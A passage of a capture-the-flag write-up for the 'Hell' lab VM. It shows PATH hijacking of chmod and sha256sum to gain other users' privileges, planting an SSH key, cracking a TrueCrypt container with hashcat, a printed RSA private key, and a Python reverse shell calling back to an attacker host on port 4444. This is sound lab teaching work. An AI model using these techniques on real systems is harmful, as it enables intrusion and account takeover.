<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>$ ./game &amp;
I<span style=color:#960050;background-color:#1e0010>&#39;</span>m listening

$ ./game
Traceback <span style=color:#f92672>(</span>most recent call last<span style=color:#f92672>)</span>:
  File <span style=color:#e6db74>&#34;/usr/bin/game.py&#34;</span>, line 58, in &lt;module&gt;
    tcpSocket.bind<span style=color:#f92672>((</span><span style=color:#e6db74>&#34;0.0.0.0&#34;</span>, 1337<span style=color:#f92672>))</span>
  File <span style=color:#e6db74>&#34;/usr/lib/python2.7/socket.py&#34;</span>, line 224, in meth
    <span style=color:#66d9ef>return</span> getattr<span style=color:#f92672>(</span>self._sock,name<span style=color:#f92672>)(</span>*args<span style=color:#f92672>)</span>
socket.error: <span style=color:#f92672>[</span>Errno 98<span style=color:#f92672>]</span> Address already in use
Lol nope
$
</code></pre></div><p>tcp/1337 it is. Lets telnet to this:</p>
<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>milk_4_life@hell:~$ telnet 127.0.0.1 <span style=color:#ae81ff>1337</span>
Trying 127.0.0.1...
Connected to 127.0.0.1.
Escape character is <span style=color:#e6db74>&#39;^]&#39;</span>.
Type <span style=color:#e6db74>&#39;START&#39;</span> to begin

START
Starting...

You have <span style=color:#ae81ff>30</span> seconds to get as many points as you can, beat the high score! <span style=color:#f92672>(</span>High Score: 133723<span style=color:#f92672>)</span>

Quick what<span style=color:#e6db74>&#39;s... 397 x 358? 1
</span><span style=color:#e6db74>Quick what&#39;</span>s... <span style=color:#ae81ff>498</span> x 111? <span style=color:#ae81ff>2</span>
Quick what<span style=color:#960050;background-color:#1e0010>&#39;</span>s... <span style=color:#ae81ff>740</span> x 772?
Final Score: <span style=color:#ae81ff>0</span>

Connection closed by foreign host.
milk_4_life@hell:~$
</code></pre></div><p>Typing anything other than <code>START</code> would simply cause the script to die. Typing a non integer as a answer causes a loop, and that is about it.
Sooo, time to win this game and see what would happen. I decided to attempt this with a python script. The general idea would be to read the socket output, calculate the answer and send that back. This resulted in a script as follows (yeah I know its not perfect but gets the job done):</p>
<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=color:#75715e>#!/usr/bin/python</span>
<span style=color:#f92672>import</span> socket<span style=color:#f92672>,</span> sys

<span style=color:#75715e># start a socket</span>
sock <span style=color:#f92672>=</span> socket<span style=color:#f92672>.</span>socket()
<span style=color:#75715e># connect locally</span>
sock<span style=color:#f92672>.</span>connect((<span style=color:#e6db74>&#39;127.0.0.1&#39;</span>, <span style=color:#ae81ff>1337</span>))
ret <span style=color:#f92672>=</span> sock<span style=color:#f92672>.</span>recv(<span style=color:#ae81ff>1024</span>)   <span style=color:#75715e># read 1024 bytes</span>
print <span style=color:#e6db74>&#39;[I] </span><span style=color:#e6db74>%s</span><span style=color:#e6db74>&#39;</span> <span style=color:#f92672>%</span> ret<span style=color:#f92672>.</span>strip()
<span style=color:#75715e># start the game</span>
print <span style=color:#e6db74>&#39;[O] START&#39;</span>
sock<span style=color:#f92672>.</span>send(<span style=color:#e6db74>&#39;START</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>&#39;</span>) <span style=color:#75715e># START the game</span>
ret <span style=color:#f92672>=</span> sock<span style=color:#f92672>.</span>recv(<span style=color:#ae81ff>1024</span>)   <span style=color:#75715e># read 1024 bytes</span>
print <span style=color:#e6db74>&#39;[I] </span><span style=color:#e6db74>%s</span><span style=color:#e6db74>&#39;</span> <span style=color:#f92672>%</span> ret<span style=color:#f92672>.</span>strip()

<span style=color:#75715e># Start reading the socket input and calculating answers sending them back</span>
<span style=color:#66d9ef>while</span> <span style=color:#66d9ef>True</span>:
   ret <span style=color:#f92672>=</span> sock<span style=color:#f92672>.</span>recv(<span style=color:#ae81ff>1024</span>)
   print <span style=color:#e6db74>&#39;[I] </span><span style=color:#e6db74>%s</span><span style=color:#e6db74>&#39;</span> <span style=color:#f92672>%</span> ret<span style=color:#f92672>.</span>strip()

   <span style=color:#75715e># split by spaces</span>
   ret <span style=color:#f92672>=</span> ret<span style=color:#f92672>.</span>split(<span style=color:#e6db74>&#39; &#39;</span>)

   <span style=color:#75715e># a question line</span>
   <span style=color:#66d9ef>if</span> ret[<span style=color:#ae81ff>0</span>] <span style=color:#f92672>==</span> <span style=color:#e6db74>&#39;Quick&#39;</span>:
      <span style=color:#75715e># extract the 2 integers from:</span>
      <span style=color:#75715e># [&#39;Quick&#39;, &#34;what&#39;s...&#34;, &#39;435&#39;, &#39;x&#39;, &#39;574?&#39;, &#39;&#39;]</span>
      one <span style=color:#f92672>=</span> int(ret[<span style=color:#ae81ff>2</span>])
      two <span style=color:#f92672>=</span> int(ret[<span style=color:#ae81ff>4</span>]<span style=color:#f92672>.</span>replace(<span style=color:#e6db74>&#39;?&#39;</span>,<span style=color:#e6db74>&#39;&#39;</span>))   <span style=color:#75715e># remove the comma</span>
      answer <span style=color:#f92672>=</span> one <span style=color:#f92672>*</span> two
      print <span style=color:#e6db74>&#39;[O] Answer </span><span style=color:#e6db74>%s</span><span style=color:#e6db74>&#39;</span> <span style=color:#f92672>%</span> answer
      sock<span style=color:#f92672>.</span>send(str(answer) <span style=color:#f92672>+</span> <span style=color:#e6db74>&#39;</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>&#39;</span>)

   <span style=color:#75715e># once the 30 seconds passes, a line with Final will return. This</span>
   <span style=color:#75715e># is the end of the game</span>
   <span style=color:#66d9ef>elif</span> ret[<span style=color:#ae81ff>0</span>] <span style=color:#f92672>==</span> <span style=color:#e6db74>&#39;Final&#39;</span>:
      print <span style=color:#e6db74>&#39;Done?&#39;</span>
      sock<span style=color:#f92672>.</span>close()
      sys<span style=color:#f92672>.</span>exit(<span style=color:#ae81ff>0</span>)

   <span style=color:#75715e># if we dont know what to do, just &#39;press enter&#39;</span>
   <span style=color:#66d9ef>else</span>:
      sock<span style=color:#f92672>.</span>send(<span style=color:#e6db74>&#39;</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>&#39;</span>)
sock<span style=color:#f92672>.</span>close()
</code></pre></div><p>I ran this in another session with <code>./game</code> running and won :P Once you win, the output results in:</p>
<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>!*!*!*!*! Congratulations, new high score <span style=color:#f92672>(</span>302785<span style=color:#f92672>)</span> !*!*!*!*!

I hear the faint sound of chmodding.......
</code></pre></div><p>&mldr; and ends. Heh, ok. Well that was probably not exactly what I hoped for, but nonetheless, the chmodding is at least a hint. The first thing that came to mind is a important file that was previously not available now possibly is as its been chmodded by <code>george</code> after winning the game. Or, if it is in fact a chmod that is being run, is it being called via a system command from its full path (/usr/bin/chmod), or just via chmod?</p>
<p>To test, I fired up another editor on <code>chmod.py</code> and just put a line to echo test. I <code>chmod +x</code> this and moved the file to <code>/tmp</code>. I then added <code>/tmp</code> to <code>PATH</code> via <code>export PATH=/tmp:$PATH</code>:</p>
<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>milk_4_life@hell:~$ python chmod.py          <span style=color:#75715e># test the script</span>
Testing chmod exec
milk_4_life@hell:~$ cp chmod.py /tmp/chmod   <span style=color:#75715e># copy it to /tmp</span>
milk_4_life@hell:~$ chmod +x /tmp/chmod      <span style=color:#75715e># make it executable</span>
milk_4_life@hell:~$ /tmp/chmod               <span style=color:#75715e># test it</span>
Testing chmod exec
milk_4_life@hell:~$ export PATH<span style=color:#f92672>=</span>/tmp:$PATH   <span style=color:#75715e># prefix PATH with /tmp</span>
milk_4_life@hell:~$ chmod                    <span style=color:#75715e># test it without full path</span>
Testing chmod exec
milk_4_life@hell:~$ ./game                   <span style=color:#75715e># start the game</span>
I<span style=color:#960050;background-color:#1e0010>&#39;</span>m listening
Testing chmod exec                           <span style=color:#75715e># profit :)</span>
</code></pre></div><p>With it confirmed that <code>chmod</code> was not called from its full path once you win the game (using our previously mentioned winning script :D), it was time to edit our <code>chmod</code> script to be slightly more useful:</p>
<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=color:#75715e>#!/usr/bin/python</span>
<span style=color:#f92672>import</span> pty
pty<span style=color:#f92672>.</span>spawn(<span style=color:#e6db74>&#39;/bin/sh&#39;</span>)
</code></pre></div><p>With this now in /tmp/chmod, I reran <code>./game.py</code>, and then <code>./play_game.py</code>. After 30 seconds on the session we started the game we had:</p>
<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>milk_4_life@hell:~$ ./game
I<span style=color:#960050;background-color:#1e0010>&#39;</span>m listening
$ id
uid<span style=color:#f92672>=</span>1002<span style=color:#f92672>(</span>milk_4_life<span style=color:#f92672>)</span> gid<span style=color:#f92672>=</span>1002<span style=color:#f92672>(</span>milk_4_life<span style=color:#f92672>)</span> euid<span style=color:#f92672>=</span>1000<span style=color:#f92672>(</span>george<span style=color:#f92672>)</span> groups<span style=color:#f92672>=</span>1000<span style=color:#f92672>(</span>george<span style=color:#f92672>)</span>,1002<span style=color:#f92672>(</span>milk_4_life<span style=color:#f92672>)</span>
$
</code></pre></div><p>Profit! We now have access to <code>george</code>&rsquo;s home directory :) In order to make the next steps easier, I quickly generated a new ssh key pair using <code>ssh-keygen</code>, and added the contents of the resultant <code>id_rsa.pub</code> to <code>.ssh/authorized_keys</code>. Whats important to note in the below snippet is that the full path of <code>chmod</code> is used. If we don’t, we will be hitting the chmod we just fooled to get to this shell in the first place :D</p>
<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>$ id
uid<span style=color:#f92672>=</span>1002<span style=color:#f92672>(</span>milk_4_life<span style=color:#f92672>)</span> gid<span style=color:#f92672>=</span>1002<span style=color:#f92672>(</span>milk_4_life<span style=color:#f92672>)</span> euid<span style=color:#f92672>=</span>1000<span style=color:#f92672>(</span>george<span style=color:#f92672>)</span> groups<span style=color:#f92672>=</span>1000<span style=color:#f92672>(</span>george<span style=color:#f92672>)</span>,1002<span style=color:#f92672>(</span>milk_4_life<span style=color:#f92672>)</span>
$ cd /home/george
$ mkdir .ssh
$ /bin/chmod <span style=color:#ae81ff>755</span> .ssh
$ cd .ssh
$ echo <span style=color:#e6db74>&#34;ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC3KB7V05tHJAWFavTgTK1dDIcUUVyUpZA3TYQhydNjeexWDeVzPNUGCo3/XZNgqw0QpaoX5eLm9k9OqxNyr7x5B6Rq2F7ykA0DHglbM4DLJDQRawHgoCzTwxBWAMva3HUbahounJFe9fOaECGZEsCmTF1462wTuZ/SYOO9lSHv38cO8b9nC5lteBz2An34+W/n9X1sxBAlDAHyXmAqJYpoE+gur+YX8j3WPNJbiBu3nVnvpDaR1BnvN1n74/yUtLYziT5Gt7lgRWiaDhzslR+46xbu/YmCyO03ztHhD/lD2JAcoEe43FKFUdh8ZGfBqCq0CbBB86KHhhLzV6QjLHjV root@kali&#34;</span> &gt; authorized_keys
$ /bin/chmod <span style=color:#ae81ff>600</span> authorized_keys
</code></pre></div><p>Now we can SSH into the VM as <code>george</code></p>
<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>root@kali:~# ssh george@192.168.56.102 -i id_rsa
Linux hell 3.2.0-4-486 <span style=color:#75715e>#1 Debian 3.2.57-3+deb7u2 i686</span>

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms <span style=color:#66d9ef>for</span> each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
No mail.
Last login: Sat Jul  <span style=color:#ae81ff>5</span> 19:26:25 <span style=color:#ae81ff>2014</span>
george@hell:~$
</code></pre></div><h2 id=becoming-bazza>becoming bazza<a hidden class=anchor aria-hidden=true href=#becoming-bazza>#</a></h2>
<p>George&rsquo;s home directory had what looked like a TrueCrypt container <code>4.0M Jun 19 21:09 container.tc</code> in hes home directory. TrueCrypt appeared to be installed on the VM, and attempting to mount the container failed due to an invalid keyfile and or password.</p>
<p><code>george</code> also had mail in <code>/var/mail</code>:</p>
<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>george@hell:~$ cat /var/mail/george/signup.eml
From: admin@rockyou.com
To: super_admin@hell.com
Subject: Account Activation
Date: 13th November <span style=color:#ae81ff>2009</span>

Thanks <span style=color:#66d9ef>for</span> signing up <span style=color:#66d9ef>for</span> your account. I hope you enjoy our services.
george@hell:~$
</code></pre></div><p>There is a mention of <em>rockyou</em> in the From address. There is a famous rockyou wordlist used for password cracking out in the wild. With that in mind, and the fact that it was 0430 already, I decided to copy the <code>container.tc</code> to my Kali Linux install, and have <code>truecrack</code> have a go at it while I catch up on some much deserved sleep.</p>
<h3 id=fast-forward-a-few-hours>fast forward a few hours<a hidden class=anchor aria-hidden=true href=#fast-forward-a-few-hours>#</a></h3>
<p>A few hours passed, with 0 luck on cracking the password for the container. I started to realize that this <em>may</em> not be the correct path in getting the container open, assuming that is the next step. However, as a last resort, I opted to copy the files onto my Windows gaming PC and run it via a GPU cracker, <a href=http://hashcat.net/oclhashcat/>oclHashcat</a>.</p>
<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>C:<span style=color:#ae81ff>\U</span>sers<span style=color:#ae81ff>\S</span>omedude<span style=color:#ae81ff>\D</span>ownloads<span style=color:#ae81ff>\o</span>clHashcat-1.21<span style=color:#ae81ff>\o</span>clHashcat-1.21&gt;oclHashcat64.exe
-m <span style=color:#ae81ff>6211</span> C:<span style=color:#ae81ff>\U</span>sers<span style=color:#ae81ff>\S</span>omedude<span style=color:#ae81ff>\D</span>esktop<span style=color:#ae81ff>\H</span>ell<span style=color:#ae81ff>\c</span>ontainer.tc C:<span style=color:#ae81ff>\U</span>sers<span style=color:#ae81ff>\S</span>omedude<span style=color:#ae81ff>\D</span>esktop<span style=color:#ae81ff>\H</span>ell<span style=color:#ae81ff>\r</span>ockyou.txt

<span style=color:#f92672>[</span>snip<span style=color:#f92672>]</span>

C:<span style=color:#ae81ff>\U</span>sers<span style=color:#ae81ff>\S</span>omedude<span style=color:#ae81ff>\D</span>esktop<span style=color:#ae81ff>\H</span>ell<span style=color:#ae81ff>\c</span>ontainer.tc:letsyouupdateyourfunnotesandmore

Session.Name...: oclHashcat
Status.........: Cracked
Input.Mode.....: File <span style=color:#f92672>(</span>C:<span style=color:#ae81ff>\U</span>sers<span style=color:#ae81ff>\S</span>omedude<span style=color:#ae81ff>\D</span>esktop<span style=color:#ae81ff>\H</span>ell<span style=color:#ae81ff>\r</span>ockyou.txt<span style=color:#f92672>)</span>
Hash.Target....: File <span style=color:#f92672>(</span>C:<span style=color:#ae81ff>\U</span>sers<span style=color:#ae81ff>\S</span>omedude<span style=color:#ae81ff>\D</span>esktop<span style=color:#ae81ff>\H</span>ell<span style=color:#ae81ff>\c</span>ontainer.tc<span style=color:#f92672>)</span>
Hash.Type......: TrueCrypt 5.0+ PBKDF2-HMAC-RipeMD160 + AES
Time.Started...: Sun Jul <span style=color:#ae81ff>20</span> 14:26:08 <span style=color:#ae81ff>2014</span> <span style=color:#f92672>(</span><span style=color:#ae81ff>19</span> secs<span style=color:#f92672>)</span>
Speed.GPU.#1...:    <span style=color:#ae81ff>14578</span> H/s
Speed.GPU.#2...:    <span style=color:#ae81ff>16165</span> H/s
Speed.GPU.#*...:    <span style=color:#ae81ff>30743</span> H/s
Recovered......: 1/1 <span style=color:#f92672>(</span>100.00%<span style=color:#f92672>)</span> Digests, 1/1 <span style=color:#f92672>(</span>100.00%<span style=color:#f92672>)</span> Salts
Progress.......: 563201/14343297 <span style=color:#f92672>(</span>3.93%<span style=color:#f92672>)</span>
Skipped........: 0/563201 <span style=color:#f92672>(</span>0.00%<span style=color:#f92672>)</span>
Rejected.......: 1/563201 <span style=color:#f92672>(</span>0.00%<span style=color:#f92672>)</span>
HWMon.GPU.#1...: 64% Util, 54c Temp, 43% Fan
HWMon.GPU.#2...:  0% Util, 90c Temp, 100% Fan

Started: Sun Jul <span style=color:#ae81ff>20</span> 14:26:08 <span style=color:#ae81ff>2014</span>
Stopped: Sun Jul <span style=color:#ae81ff>20</span> 14:26:42 <span style=color:#ae81ff>2014</span>
</code></pre></div><p>About 19 seconds later, we have the password thanks to hashcat!</p>
<p>So, lets mount the container and see whats inside:</p>
<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>george@hell:~$ truecrypt container.tc
Enter mount directory <span style=color:#f92672>[</span>default<span style=color:#f92672>]</span>:
Enter password <span style=color:#66d9ef>for</span> /home/george/container.tc: letsyouupdateyourfunnotesandmore
Enter keyfile <span style=color:#f92672>[</span>none<span style=color:#f92672>]</span>:
Protect hidden volume <span style=color:#f92672>(</span><span style=color:#66d9ef>if</span> any<span style=color:#f92672>)</span>? <span style=color:#f92672>(</span>y<span style=color:#f92672>=</span>Yes/n<span style=color:#f92672>=</span>No<span style=color:#f92672>)</span> <span style=color:#f92672>[</span>No<span style=color:#f92672>]</span>:

george@hell:~$ cd /media/truecrypt1/
george@hell:/media/truecrypt1$ ls -lah
total 22K
drwx------ <span style=color:#ae81ff>2</span> george george  16K Jan  <span style=color:#ae81ff>1</span>  <span style=color:#ae81ff>1970</span> .
drwxr-xr-x <span style=color:#ae81ff>4</span> root   root   4.0K Jul <span style=color:#ae81ff>21</span> 18:50 ..
-rwx------ <span style=color:#ae81ff>1</span> george george 1.7K Jul  <span style=color:#ae81ff>5</span> 20:01 id_rsa
george@hell:/media/truecrypt1$ cat id_rsa
-----BEGIN RSA PRIVATE KEY-----
MIIEpQIBAAKCAQEAxlCbg0ln2dqRO3iIXPUvK3irg/9l5uvBAQdXTVmcm/JWN9OA
25XtZX8LOfiJtc+8OYXgD6lXNVPh9BjElq6qpR7fk1TaXXUlyiSlwCxz68n/cpYs
f6UUa9QXm0LSHD8m7g/e5qqIm8bb15TIC6+8TmSB11FE9NLPN+8hVyP1S9EBntom
t5watKDFUNF+mcl14Tj+INcWB2qpEPgZ1mIwq1Zw3w/vy27y0i1r52+fot1vgf2K
Ymo6GipsdxW1k/UuCjJEE6e0GZFA8vhpH5F4MG8k33vIPqkxgEgF0GX8RPAQF/Xf
gxERhkGP+hVOd8b11OXzxWGGQyqwOYF8+7qVjwIDAQABAoIBAQCyldpFUvBDXbEV
dgiOdXkh04vY1UBlv/3ROFQk4sLGKGf94+gRViUvFkX80VTptgWRY36Pe/Z9nmlG
0JsP+oDPK0s4uNvf92Otcm0U7rMBLals/dFarUUDiT4s4fKl3zTmgsI+xGk6psxI
icHPzFRt39KRHK1VLxXOD/jdKRN3Tk0odH1kNahOuFC2F5T+aqdlC/RAGwxnTDBe
AFPFlns83GaPYlIt05DZsdGftG7mITkNfUVS5AIyeedshU4OyPXu5bGgUgbtars4
GdttJ33Tm5hO+n3E93sW7XMKG4v4po+1Fu0OwNQNpaRo6gVqK7AZHNPxBRW7K4Zc
w2d0EXehAoGBAOQgtqb5QVyhiCdT53xjZTMHH74ApWRpsoLtu/LaZnQV0v/dzEIv
jei58v/PusXsSwOQeb4p2obOReQFbYG48vCiywwMbeOeqH2d69HYatHmxPXngKS3
6trus/pHuDJosFw1qhgVo9ao0o8IH6cveHidmwvzKfiphgM3yCXF9jyxAoGBAN6L
awHXmHQCsCq//UbHbfuaBScJOpaagKP1BIskl5RDaQ/U/DzSpxju0ldedX7HYVFW
Rk6NQQ6QiXIC/5D7Xj+tcR2EFI+Tt9xp6dE/UlxpUL1h9QCBfmdw0CT9WSwJEGF7
R+D18trKcb/NkYdJV8ZpaT00rLzyBx5MY/FZbYY/AoGBALrCwWXfR5BjOckgmrGt
2cq1uVnew4h6M8eWgzklbZz5xPzuAuvobKAro3GkCb9BXIQ1gkWZlCqqsnMjsmvy
EwnH7L0Xa9teJ4h3gfkQ2Rqwd2ztstanLyE/LJ7omjbCmCdVU8RV6wSwv3iTaP6B
EXqFZMqarzDA8FKwFy49bAJxAoGBALkXBYG7uW1LSw/TLCjw9zVaTUzBLTxS9gjn
YMcFQRir1Da5sqw3m4huIP1Pb7NoyjTm54SvkNs3NUlg2wPPPP0DGOAumRctCa9F
W5WP78UyRlesoCOyj9oihsss9zxbsYcSDJ86j6iO1Xpr08zMIDfCNigUplJjja4S
ZNE3ypLrAoGAbp+vBcqQRfnXWfmcdnHYFbwgWbokPSe2fScajWiyvcg4/6gL1e50
rpO3RTOREUD02pBbyG4LDFv7x/5niqASL0tS8/0xWDBDj5QmD9UTmMd5hsMbj8Lw
qJA0ErZEjIE9+jXYLbsTsB8tRTsqMqBfCCovHXAjy0h5B6j500PfImM<span style=color:#f92672>=</span>
-----END RSA PRIVATE KEY-----
george@hell:/media/truecrypt1$
</code></pre></div><p>So, a rsa private key. A wild shot in the dark sais this is the private key for one of the other users as per the <code>/etc/passwd</code>. I saved the key to a file on my Kali Linux box and attempted to SSH in as <code>bazza</code>, specifying the private key to use:</p>
<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>root@kali:~# ssh bazza@192.168.56.102 -i truecrypt_id_rsa
Linux hell 3.2.0-4-486 <span style=color:#75715e>#1 Debian 3.2.57-3+deb7u2 i686</span>

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms <span style=color:#66d9ef>for</span> each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Mon Jul <span style=color:#ae81ff>21</span> 18:52:50 <span style=color:#ae81ff>2014</span> from 192.168.56.1
$ id
uid<span style=color:#f92672>=</span>1004<span style=color:#f92672>(</span>bazza<span style=color:#f92672>)</span> gid<span style=color:#f92672>=</span>1004<span style=color:#f92672>(</span>bazza<span style=color:#f92672>)</span> groups<span style=color:#f92672>=</span>1004<span style=color:#f92672>(</span>bazza<span style=color:#f92672>)</span>
$
</code></pre></div><h2 id=becoming-oj>becoming oj<a hidden class=anchor aria-hidden=true href=#becoming-oj>#</a></h2>
<p><code>bazza</code> had 2 interesting files in hes home directory:</p>
<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>bazza@hell:~$ ls -lh
total 20K
-rw-r--r-- <span style=color:#ae81ff>1</span> root root        <span style=color:#ae81ff>109</span> Jul  <span style=color:#ae81ff>6</span> 18:32 barrebas.txt
-r-xr-sr-x <span style=color:#ae81ff>1</span> oj   developers 6.1K Jul  <span style=color:#ae81ff>6</span> 18:39 part1
-r-sr-xr-x <span style=color:#ae81ff>1</span> oj   oj         5.2K Jul  <span style=color:#ae81ff>6</span> 18:34 part2
</code></pre></div><p>The <code>barrebas.txt</code> looks to be a shoutout to the tester of the vulns. <code>part1</code> & <code>part2</code> from first glance had interesting permissions, and made it relatively easy to determine that the next user we should be after this is <code>oj</code>. Running <code>part1</code> and <code>part2</code>:</p>
<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>bazza@hell:~$ ./part1
Checking integrity of part2... Done!!

Checking integrity of calling target... Done!!

Binary and target confirmed.

Can<span style=color:#960050;background-color:#1e0010>&#39;</span>t touch this *nah na na na na naaaaaaaa nah*
uid<span style=color:#f92672>=</span>1004<span style=color:#f92672>(</span>bazza<span style=color:#f92672>)</span> gid<span style=color:#f92672>=</span>1004<span style=color:#f92672>(</span>bazza<span style=color:#f92672>)</span> euid<span style=color:#f92672>=</span>1005<span style=color:#f92672>(</span>oj<span style=color:#f92672>)</span> egid<span style=color:#f92672>=</span>1003<span style=color:#f92672>(</span>developers<span style=color:#f92672>)</span> groups<span style=color:#f92672>=</span>1005<span style=color:#f92672>(</span>oj<span style=color:#f92672>)</span>,1004<span style=color:#f92672>(</span>bazza<span style=color:#f92672>)</span>

bazza@hell:~$ ./part2


Error! <span style=color:#ae81ff>1004</span> ID detected ... youre not allowed to run this, please use part 1!
bazza@hell:~$
</code></pre></div><p>So it seems that part2 is protected apparently due to the fact that our uid (or groupid?) of 1004 was not allowed. Slightly cryptic, but a few thoughts about what the binaries are doing were already going about. <code>part1</code> outputs what looks like the output of the <code>id</code> command too.</p>
<p>Again, this part took some time and resulted in a rabbit-hole scenario of try something, google something, try something, google something. I am not going to go through everything I have tried for this part, but simply try depict how I managed to figure this out in the end.</p>
<p>We start with a <code>strings</code> of <code>part1</code>:</p>
<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>bazza@hell:~$ strings part1
/lib/ld-linux.so.2
__gmon_start__
libc.so.6
_IO_stdin_used
puts
popen
printf
fgets
system
pclose
strcmp
__libc_start_main
GLIBC_2.1
GLIBC_2.0
PTRh
QVhl
<span style=color:#f92672>[</span>^_<span style=color:#f92672>]</span>
900462fbf9593f1a4b753f1729c431abc80932a151e9b293e13822a91f9641c1  /home/bazza/part2
1003a011c5bdb65a07a8f92feb6b7d7ecbf3a3ff0f2a46abbe5c777c525996d8  /usr/bin/id
Checking integrity of part2...
sha256sum /home/bazza/part2
Failed to run command
 Done!!
Checking integrity of calling target...
sha256sum /usr/bin/id
Uh oh.... Corrupted or in wrong directory <span style=color:#f92672>(</span>/home/bazza/<span style=color:#f92672>)</span>
 Done!!
Binary and target confirmed.
/home/bazza/part2
Target corrupt
;*2$<span style=color:#e6db74>&#34;
</span></code></pre></div><p>This should give you a pretty good idea of what is potentially going on in the binary, like:</p>
<ul>
<li>Check the sha256sum of /gome/bazza/part matches 900462fbf9593f1a4b753f1729c431abc80932a151e9b293e13822a91f9641c1</li>
<li>Check the sha256sum of /usr/bin/id matches 1003a011c5bdb65a07a8f92feb6b7d7ecbf3a3ff0f2a46abbe5c777c525996d8</li>
<li>Eventually Fail if these don’t match.</li>
</ul>
<p>The key lies in the fact that the <code>sha256sum</code> command does not appear to be called from its full path location ie: /usr/bin/sha256sum. So, similar to how we fooled the <code>chmod</code> earlier, we are going to do exactly the same with the <code>sha256sum</code>.</p>
<p>As before, we create a <em>evil sha256sum</em> command, which is actually just a python script to spawn <code>/bin/sh</code>, then prefix <code>PATH</code> with <code>/tmp</code> and run <code>./part1</code>. For this one however, I was having trouble with the pty.spawn() and didn&rsquo;t really feel like troubleshooting that much. So I opted for a (reverse shell)[http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet] payload instead to open on a netcat listener that I have on my host laptop:</p>
<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=color:#75715e>#!/usr/bin/python</span>
<span style=color:#f92672>import</span> socket<span style=color:#f92672>,</span>subprocess<span style=color:#f92672>,</span>os

s <span style=color:#f92672>=</span> socket<span style=color:#f92672>.</span>socket(socket<span style=color:#f92672>.</span>AF_INET,socket<span style=color:#f92672>.</span>SOCK_STREAM)
s<span style=color:#f92672>.</span>connect((<span style=color:#e6db74>&#34;192.168.56.1&#34;</span>,<span style=color:#ae81ff>4444</span>))

os<span style=color:#f92672>.</span>dup2(s<span style=color:#f92672>.</span>fileno(),<span style=color:#ae81ff>0</span>)
os<span style=color:#f92672>.</span>dup2(s<span style=color:#f92672>.</span>fileno(),<span style=color:#ae81ff>1</span>)
os<span style=color:#f92672>.</span>dup2(s<span style=color:#f92672>.</span>fileno(),<span style=color:#ae81ff>2</span>)

p <span style=color:#f92672>=</span> subprocess<span style=color:#f92672>.</span>call([<span style=color:#e6db74>&#34;/bin/sh&#34;</span>,<span style=color:#e6db74>&#34;-i&#34;</span>])
</code></pre></div><p>I spawned a <code>netcat</code> listener on my laptop using <code>nc -l 4444</code>, and ran <code>./part1</code>:</p>
<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>→ nc -l <span style=color:#ae81ff>4444</span>
$ id
uid<span style=color:#f92672>=</span>1004<span style=color:#f92672>(</span>bazza<span style=color:#f92672>)</span> gid<span style=color:#f92672>=</span>1004<span style=color:#f92672>(</span>bazza<span style=color:#f92672>)</span> egid<span style=color:#f92672>=</span>1003<span style=color:#f92672>(</span>developers<span style=color:#f92672>)</span> groups<span style=color:#f92672>=</span>1004<span style=color:#f92672>(</span>bazza<span style=color:#f92672>)</span>
</code></pre></div><p>Notice that I was now in the <code>developers</code> group. I was now allowed to run <code>./part2</code> too&mldr; with a verbose line showing me the permissions I would need to gain access to <code>/home/oj</code>:</p>
